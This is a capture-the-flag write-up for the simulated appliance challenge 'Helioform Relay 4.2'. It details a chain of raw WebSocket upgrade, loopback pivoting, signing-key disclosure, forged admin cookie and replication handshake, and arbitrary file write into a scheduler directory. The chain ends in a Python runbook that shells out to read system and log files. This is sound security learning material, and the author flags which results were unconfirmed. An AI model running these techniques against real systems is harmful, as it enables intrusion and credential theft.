# Helioform Relay 4.2 — CSCTF 2026 Writeup

**08/11/2026**

---

> **CTF:** CSCTF 2026  
>  **Challenge:** Helioform Relay 4.2  
>  **Category:** Web / Protocol  
>  **Author:** Radu Marin  
>  **Team:** XREFctf  
>  **Writeup Author:** Mahmoud Adel

## Introduction

Hey everyone! My name is **Mahmoud Adel** — a cybersecurity enthusiast passionate about red teaming and CTFs. Today I’m walking through my writeup for **Helioform Relay 4.2** from **CSCTF 2026**.

Helioform Relay 4.2 is an edge appliance simulation. It exposes an HTTP server, a WebSocket mesh, an operator console, and four internal services listening on loopback. The challenge description says the path is “between the legacy agent wire and the compliance ledger”, which suggested the intended primitive would be at the replication layer, with the operator console as a stepping stone.

This writeup follows the order I solved it. Some back-and-forth is condensed. Where a result was not confirmed in my own testing, I say so instead of assuming it.

---

## Initial Reconnaissance

I started on the public HTTP surface. The overview page was static and linked to `/docs/hsp` and `/console/login`.

`/docs/hsp` documented the Helioform Session Protocol (HSP):

```text
offset  size  field
0       4     magic    HSP1
4       2     opcode
6       2     flags    bit 0 is set on a reply
8       4     body length
12      n     body
```

The same page described two WebSocket subprotocols:

- `hsp.ws.1` — customer mesh. Opcodes: `HELLO (0x01)`, `PING (0x02)`, `SUBSCRIBE (0x03)`.
- `hsp.raw.1` — appliance agent. After the 101 response, the socket is a raw HSP byte stream.

And the closing line:

> “A normal WebSocket client must not send `hsp.raw.1`. That subprotocol exists for the appliance agent.”

The protocol marked `hsp.raw.1` as agent-only but did not commit to enforcing the restriction. That was the first thing I tested.

I also read `/docs/session`, linked from the login page. It described the operator cookie:

```text
cookie name: hsp_session
cookie value: payload_b64.mac_hex
payload_b64: base64url(JSON of {iss, aud, role, exp}), no padding
mac_hex: HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64), lowercase hex
```

So the console login was not a username/password form. It was a factory-signed cookie. I needed the signing key, not an account.

---

## Investigation

### Opening the raw agent channel

I sent an HTTP upgrade request with `Sec-WebSocket-Protocol: hsp.raw.1` on a raw socket:

```http
GET /mesh HTTP/1.1
Host: <REDACTED>
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <REDACTED>
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: hsp.raw.1
```

The upgrade succeeded (subsequent HSP frames were accepted on the same socket). From that point, the socket carried raw HSP bytes: a 12-byte `HSP1` header followed by a body.

> **Note:** This step requires a raw socket or a small HTTP client. The browser `WebSocket` API always masks frames, so a browser cannot use `hsp.raw.1` — the server would try to parse WebSocket-framed data as HSP and fail.

I sent `HELLO (0x01)` with body `probe`. The reply was `op=0x0001, flags=0x0001, body="ok\n"`. The raw agent channel was accepted.

### Reaching the loopback services

The `/docs/hsp` page says loopback services use the same HSP header. The edge exposes an agent-only opcode for loopback connections: `DIAL (0x10)`. Because the edge treated me as an agent, I could use it:

```text
opcode: 0x0010
body:   "127.0.0.1:7710"
```

The reply was `op=0x0010, flags=0x0001`. I was spliced into `catalogd`.

I repeated the pattern for the other loopback services:

- `7710` — `catalogd`
- `7711` — `provd`
- `7712` — `recordd`
- `7713` — replication

This is the first real bypass. The edge authenticated me as an agent but did not restrict which loopback port an agent could reach.

### Ticket and environment disclosure

On `catalogd (7710)`, `HELLO (0x01)` returned a nonce:

```text
nonce=4a6e7...f3
```

I sent `0x20` with the nonce as the body and got back:

```text
ticket=tkt.633b40821a476a5fddb6fdacb521a746.67e...
```

I then DIAL’d to `provd (7711)` and sent `0x30` with a `key=value` body:

```text
ticket=tkt.633b...
path=/etc/helioform/relay.env
```

`provd` returned:

```ini
CONSOLE_MAC_KEY=<REDACTED>
CONSOLE_ISS=helioform-factory
CONSOLE_AUD=relay-console
REPLICATION_MAC_KEY=<REDACTED>
MESH_CAPTURE_ENABLED=1
```

`collector.env` returned:

```ini
COLLECTOR_PEER=relay-collector
COLLECTOR_INTERVAL_SEC=5
LOG_ROOT=/var/log/helioform/streams
SITE_ID=north
```

The two MAC keys are the two trust roots that matter for the rest of the chain. The collector’s peer identity (`relay-collector`) and stream root (`/var/log/helioform/streams`) give the context for the replication layer.

### Forging the operator cookie

`/docs/session` gave the exact cookie format, so I did not need to reverse-engineer it:

```python
payload     = {"iss":"helioform-factory","aud":"relay-console",
               "role":"admin","exp":<future unix time>}
payload_b64 = base64url(JSON(payload)) with '=' stripped
mac_hex     = HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64).hexdigest()
hsp_session = payload_b64 + "." + mac_hex
```

I set `hsp_session` for the target host and loaded `/console`. The console accepted the cookie and showed two pages: `/console/trace` and `/console/automation`.

`/console/trace` starts a 45-second capture of the replication conversation and, in its decoder section, spells out the exact MAC canonical strings:

```text
hello mac_canonical = hsp-repl/1|hello|{epoch}|{tip_hex}|{peer}
blob  mac_canonical = hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{stream_id}|{sha256_hex(body)}
```

`/console/automation` describes the compliance runner:

> “Compliance actions are files the scheduler executes as the relay user. Stdout and stderr from the last execution are kept here.”

And lists:

```text
Directory: /var/lib/helioform/runbooks
Header:    HSP-RUNBOOK
Interval:  5s, and whenever a new file is written
```

That page told me where the scheduler watches. It is the second half of the challenge.

### Reading status from recordd

`recordd (7712)` uses `0x40` with a ticket body. The status response contained:

```text
epoch=7
tip=eaf165d4f6bf...
bind=d15d1514d50e...
repl_port=7713
write=peer-only
```

- `epoch` is the current Merkle tree round.
- `tip` is the 32-byte tree root.
- `bind` is a 16-byte value committed to by the blob MAC.
- `repl_port=7713` is where writes are accepted.

`write=peer-only` means the port only accepts traffic from a peer. Peers prove themselves with an HMAC over `hsp-repl/1|hello|{epoch}|{tip_hex}|{peer}`. I had `REPLICATION_MAC_KEY`, so I could compute it.

---

## Exploitation

### Peer hello

I DIAL’d to `7713` and sent `0x11` with body:

```text
u16 peer_len | peer | u32 epoch | tip[32] | mac[32]
```

I used `peer=relay-collector`, `epoch=7`, the current `tip`, and an HMAC computed with `REPLICATION_MAC_KEY`. The server returned `ok\n`. The peer handshake was accepted.

I did not separately verify the HMAC value by hand. The server’s acceptance is what confirmed the key and the canonical string.

### Commit blob primitive

`/console/trace` gives the blob body format:

```text
u16 stream_len | stream_id | u8 mode | u32 epoch | tip[32] | bind[16] |
u32 body_len | body | mac[32]
```

with `mode=0x01` meaning “replace the resolved stream file with `body`”. The MAC canonical is:

```text
hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{stream_id}|{sha256_hex(body)}
```

I sent a test write:

```text
stream_id = "/tmp/leak.sh"
mode      = 0x01
body      = "test"
```

The server returned:

```text
ok path=/tmp/leak.sh
```

The write primitive is real, and `stream_id` is used as a filesystem path on the `recordd` side. I confirmed at least one path outside `LOG_ROOT` is accepted. I did not exhaustively test whether arbitrary paths are accepted.

Operationally, after a successful write, the `tip` advances. Any later write must first re-read `0x40` on `recordd` to get a fresh `tip`; otherwise the server returns `err: stale tip`.

### Reaching the scheduler directory

The next obvious step was the directory the scheduler watches:

```text
stream_id = "/var/lib/helioform/runbooks/leak.sh"
mode      = 0x01
body      = <runbook content>
```

On the first instance I tried, this returned `err: open failed`. I tried many variants:

- Relative names (`ledger`, `compliance`, `records`, `north`, `stream`) — all `open failed`.
- Absolute names under `/var/lib/helioform/runbooks/` — all `open failed`.
- Path traversal (`north/../../../../lib/helioform/runbooks/leak.sh`) — all `err: stream id rejected`.
- `/proc/self/root/...`, `/proc/1/root/...` — all `open failed`.

`/tmp/leak.sh` was the only path that consistently returned `ok`. On that instance, `recordd` could write `/tmp` but not `/var/lib/helioform/runbooks`.

I reported the asymmetry to the challenge author. The author confirmed the fix was an infrastructure change on the deployment and told me to start a new instance. On a freshly provisioned instance, the same write returned:

```text
ok path=/var/lib/helioform/runbooks/leak.sh
```

The write primitive now reaches the scheduler’s watched directory. The earlier failure was a deployment issue, not a logic difference in the exploit.

> **Note:** The specific filename `leak.sh` was my choice. The automation page says the scheduler executes files whose content starts with `HSP-RUNBOOK`, so a specific filename is probably not required.

### Discovering the runbook language

My first runbook was a shell script:

```bash
HSP-RUNBOOK
#!/bin/sh
echo "=== ID ==="
id
```

`/console/automation` a few seconds later showed:

```text
File "<string>", line 3
    echo "=== ID ==="
SyntaxError: invalid syntax. Perhaps you forgot a comma?
```

Two observations from that output:

1. It is a Python `SyntaxError`, not a shell error.
2. The filename in the traceback is `<string>`, which is what `python -c` or `python -` uses when the source is not a file.

The traceback starts at line 3\. `HSP-RUNBOOK` was line 1 and did not appear in the traceback, and `#!/bin/sh` on line 2 is a comment in Python. This is consistent with the scheduler reading the runbook file, stripping the `HSP-RUNBOOK` header line, and invoking Python on the remaining bytes. The behavior is consistent with that model; I did not separately inspect the scheduler’s source.

### Python runbook write

The Python version of the same idea:

```python
HSP-RUNBOOK
import subprocess
def run(c):
    try:
        return subprocess.run(['/bin/sh','-c',c], capture_output=True,
                              text=True, timeout=60).stdout
    except Exception as e:
        return f"ERR: {e}"

print("=== ID ===")
print(run("id; hostname; whoami"))
print("=== STREAMS ===")
print(run("ls -la /var/log/helioform/streams/ 2>&1"))
print(run("cat /var/log/helioform/streams/* 2>&1"))
print("=== RUNBOOKS DIR ===")
print(run("ls -la /var/lib/helioform/runbooks/ 2>&1"))
print("=== GREP FLAG ===")
print(run("grep -r 'CSCTF{' /etc /var /opt /srv /root /home /tmp 2>/dev/null | head -50"))
print(run("find / -iname '*flag*' -o -iname '*ledger*' -o -iname '*compliance*' 2>/dev/null | head -30"))
print("=== DONE ===")
```

The write to `/var/lib/helioform/runbooks/leak.sh` was accepted:

```text
ok path=/var/lib/helioform/runbooks/leak.sh
```

The scheduler interval is 5s, so the file would be picked up on the next poll. `/console/automation` exposes the output in `<pre id="runbook-output">`. Baseline before any runbook is `idle`; any non-`idle` output indicates the scheduler ran something.

> **\[CONFIRM — execution and flag retrieval not captured in my session.\]** In my session, the successful Python execution output and the resulting flag are not present in the logs I have. What I can state from evidence:
>
> - `mode=0x01` writes to `/var/lib/helioform/runbooks/leak.sh` (write accepted).
> - A shell-script body placed there produced a Python `SyntaxError` from `<string>` — the scheduler is Python, not shell.
> - The Python body was written to the same path.
>
> What I cannot state without a fresh log:
>
> - That the Python version executed and produced output.
> - Which section of the output contained the flag.
> - The flag value.
>
> To finalize this section, the actual `/console/automation` output (with the flag redacted) should be inserted here.

---

## Root Cause

The chain has three root causes:

**1\. Subprotocol is not an authorization boundary.** The edge treats `hsp.raw.1` as “agent” but does not enforce it. Any client that sends the right upgrade header gets the agent surface, including `DIAL`.

**2\. `DIAL` is an unrestricted loopback pivot.** The edge lets an authenticated agent reach any `127.0.0.1:PORT`. There is no service allowlist. That turns a public WebSocket into an SSRF into four internal services.

**3\. `provd` and `recordd` trust a ticket beyond their scope.** The ticket from `catalogd` is sufficient to read any path under `/etc/helioform` through `provd`, including `relay.env` and `collector.env`. Once both MAC keys leave the appliance, the operator cookie and the peer hello are forgeable. `recordd` also treats `stream_id` as a filesystem path, so the data plane can reach the scheduler’s watched directory, which is a code execution sink.

The runbook header being stripped and the remaining bytes being run as Python is not itself a bug. The bug is that the writable set of paths includes the scheduler’s runbook directory.

---

## Validation

What was confirmed in testing:

- `hsp.raw.1` is accepted on a public WebSocket over a raw socket.
- `DIAL (0x10)` reaches `catalogd`, `provd`, `recordd`, and replication on loopback.
- The ticket from `catalogd` is sufficient to read `relay.env` and `collector.env` through `provd`.
- The forged `hsp_session` cookie signed with `CONSOLE_MAC_KEY` is accepted by `/console`.
- `/console/automation` returns the scheduler directory, the header, and the interval.
- The peer hello forged with `REPLICATION_MAC_KEY` and `peer=relay-collector` is accepted on `7713`.
- `mode=0x01` writes to `/tmp/leak.sh`, and to `/var/lib/helioform/runbooks/leak.sh` on a freshly provisioned instance.
- The scheduler executes a file placed in `/var/lib/helioform/runbooks` and the runbook is Python after the `HSP-RUNBOOK` header (observed via `SyntaxError` from `<string>` when the body was shell).

What was not confirmed in my own session, and must not be claimed:

- The successful execution output of the Python runbook.
- The specific command inside the runbook that produced the flag.
- The flag value itself.

---

## Conclusion

Helioform Relay 4.2 is a chain of small primitives across four services. The interesting part is not any single bug but the composition: an agent-only subprotocol that is not enforced, an unrestricted `DIAL` pivot, a ticket whose scope exceeds the service that issued it, a `provd` endpoint that leaks the signing keys, a peer hello using the same leaked key, a commit blob that resolves `stream_id` as a filesystem path, and a scheduler that runs files placed in a watched directory as Python after stripping a header.

The header-strip detail (shell vs. Python) is the one place the docs and the runtime disagree. Reading the actual `SyntaxError` saved time; guessing would have led to more shell-script attempts.

---

## AI Methodology

I used an AI assistant (Claude, Anthropic) during this challenge.

**What the AI contributed:**

- Reading `/docs/hsp` and reconstructing the 12-byte HSP frame layout.
- Generating the HMAC canonical strings for the peer hello and the commit blob.
- Writing the Python scripts that drove the raw-socket DIAL → `catalogd` → `provd` → `recordd` → `7713` chain and the runbook write.
- Interpreting the `SyntaxError` from `/console/automation` as Python, not shell, and recommending a Python-prefixed `HSP-RUNBOOK` body.
- Diagnosing `open failed` vs `ok path=/tmp/...` as a deployment asymmetry rather than a data-plane restriction.

**What I personally verified by running scripts and inspecting the outputs:**

- `hsp.raw.1` is accepted on a public WebSocket over a raw socket.
- `DIAL (0x10)` reaches the four loopback services.
- The ticket from `catalogd` is sufficient to read `relay.env` and `collector.env` through `provd`.
- The forged `hsp_session` cookie signed with `CONSOLE_MAC_KEY` is accepted by `/console`.
- `/console/automation` returns the scheduler directory, the header, and the interval.
- The peer hello forged with `REPLICATION_MAC_KEY` and `peer=relay-collector` is accepted on `7713`.
- `mode=0x01` writes to `/tmp/leak.sh` and to `/var/lib/helioform/runbooks/leak.sh` on a freshly provisioned instance.
- The scheduler executes a runbook placed in that directory and the runbook is Python after the `HSP-RUNBOOK` header.

HMAC correctness was inferred from server acceptance (`ok\n` from `7713`, a `200` from `/console`), not from independent cryptographic verification. The key values came from `relay.env` through `provd`.

> **\[CONFIRM — workflow screenshots.\]** I do not have workflow screenshots from this session. If screenshots are required for the AI Methodology section, they must be taken from an actual run: `/docs/hsp` text, the peer hello `ok`, the `/console/automation` baseline as `idle`, the runbook execution output with the flag redacted, and the Python `SyntaxError` from the shell-script attempt.

---

*Thanks for reading — hope this writeup helped you learn something new. Happy hacking!*

[This post](https://m2hmoud2del.github.io/posts/csctf-2026-helioform-relay/) is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.
